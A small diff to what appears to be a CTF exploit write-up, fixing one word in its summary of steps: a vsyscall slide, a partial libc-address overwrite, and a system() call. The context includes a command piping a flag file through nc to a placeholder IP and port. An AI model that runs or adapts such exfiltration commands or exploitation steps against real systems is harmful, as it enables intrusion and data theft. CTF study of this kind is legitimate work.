@@ -57,7 +57,7 @@ So, to sum things up we have the following points to finish up our exploit:
 
 2. Make sure that when we start jumping to the `vsyscall` "slide", `rdi+127` holds the string `"cat flag | nc IP PORT"` (this is easily done because `rdi+127` is controlled by us!).
 
-3. Once we read the libc address, overwrite it partially with 3 bytes - these 3 bytes will be the 3 least significant bytes of the "patched-in" gadgets, which will finally execute: `system(rdi+127)` which is `system("/bin/sh")`.
+3. Once we reach the libc address, overwrite it partially with 3 bytes - these 3 bytes will be the 3 least significant bytes of the "patched-in" gadgets, which will finally execute: `system(rdi+127)` which is `system("/bin/sh")`.
 
 4. Profit!
 
